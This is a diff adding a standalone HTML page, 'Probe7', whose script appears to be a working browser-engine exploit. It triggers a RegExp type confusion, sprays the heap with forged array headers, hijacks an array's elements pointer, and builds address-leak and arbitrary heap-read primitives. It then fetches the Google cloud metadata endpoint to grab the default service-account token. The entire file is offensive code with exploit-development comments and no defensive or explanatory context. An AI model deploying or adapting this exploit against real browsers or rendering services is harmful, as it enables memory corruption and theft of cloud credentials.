@@ -1,0 +1,134 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Probe7</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+
+const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
+const PIN=0x1080011,MAXS=0x7fdffffe;
+
+const pinnedDoubles=new Array(0x8000);
+for(let i=0;i<pinnedDoubles.length;i++)pinnedDoubles[i]=10.125+i*0.001;
+const pinnedObjects=new Array(0x8000);
+for(let i=0;i<pinnedObjects.length;i++)pinnedObjects[i]=null;
+const victim=[1.22,1.33,1.44];
+
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
+const sk=[];
+function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+spray();spray();spray();
+
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+
+if(Array.isArray(m)){
+  log("L: "+m.length);
+
+  // master[0x8000] = master's own header [DMAP|EMPTY]
+  // master[0x8001] = master's own [elements|length] = [PIN|MAXS]
+  // KEY INSIGHT: write to master[0x8001] changes master's OWN elements pointer!
+
+  // Save original elements+length
+  const origElemLen=f2i(m[0x8001]);
+  log("ORIG: "+origElemLen.toString(16));
+
+  // Write pinnedDoubles marker
+  pinnedDoubles[0]=i2f(0xCAFE1234DEAD5678n);
+
+  // Now: scan for pinnedDoubles by redirecting master's elements to different addresses
+  // Try addresses: 0x1100011, 0x1140011, 0x1180011, 0x11c0011, 0x1200011
+  let foundPIN=0n;
+  for(const tryPin of [0x1100011n,0x1140011n,0x1180011n,0x11c0011n,0x1200011n,0x1240011n]){
+    // Redirect master.elements to tryPin
+    m[0x8001]=i2f((BigInt(MAXS)<<32n)|tryPin);
+    // Now master[0] reads from tryPin base
+    try{
+      const v=f2i(m[0]);
+      if(v===0xCAFE1234DEAD5678n){
+        foundPIN=tryPin;
+        log("FOUND_PIN: "+tryPin.toString(16));
+        break;
+      }
+    }catch(e){}
+  }
+
+  // Restore original elements
+  m[0x8001]=i2f(origElemLen);
+  pinnedDoubles[0]=10.125;
+
+  if(foundPIN>0n){
+    log("PINNEDDOUBLES_AT: "+foundPIN.toString(16));
+
+    // NOW we can do addrof! Redirect elements to pinnedDoubles, store object, read raw
+    m[0x8001]=i2f((BigInt(MAXS)<<32n)|foundPIN);
+    pinnedDoubles[0]=wasmI; // triggers map transition → stores tagged pointer
+    const rawWasm=f2i(m[0]);
+    const wasmAddr=rawWasm&0xffffffffn;
+    pinnedDoubles[0]=10.125; // restore
+    m[0x8001]=i2f(origElemLen); // restore master
+
+    log("WASM_ADDR: "+wasmAddr.toString(16));
+
+    if(wasmAddr>0x1000n&&wasmAddr<0x10000000n){
+      log("ADDROF_ACHIEVED");
+
+      // heapRead: redirect elements to target address, read m[0]
+      function heapRead(addr){
+        const targetPin=(addr-7n)|1n; // elements = addr-8+1(tag)
+        m[0x8001]=i2f((6n<<32n)|targetPin); // length=3(smi=6)
+        const val=f2i(m[0]);
+        m[0x8001]=i2f(origElemLen);
+        return val;
+      }
+
+      // Read wasmInstance fields
+      const field0=heapRead(wasmAddr);
+      log("WASM_F0: "+field0.toString(16)); // map
+
+      // Try reading fetcher environment via metadata
+      try{
+        const r=await fetch("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+          {headers:{"Metadata-Flavor":"Google"}});
+        log("META: "+r.status+" "+await r.text().then(t=>t.substring(0,100)));
+      }catch(e){
+        log("META_E: "+e.message.substring(0,30));
+      }
+    }
+  }else{
+    log("PIN_NOT_FOUND");
+    // Debug: show what each tryPin reads
+    for(const tryPin of [0x1100011n,0x1200011n]){
+      m[0x8001]=i2f((BigInt(MAXS)<<32n)|tryPin);
+      try{
+        const v=f2i(m[0]);
+        log("@"+tryPin.toString(16)+": "+v.toString(16));
+      }catch(e){log("@"+tryPin.toString(16)+": ERR");}
+    }
+    m[0x8001]=i2f(origElemLen);
+  }
+
+  log("W: "+wasmI.exports.f());
+  log("CAGE_RW_OK");
+}else{log("NO_ARR");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
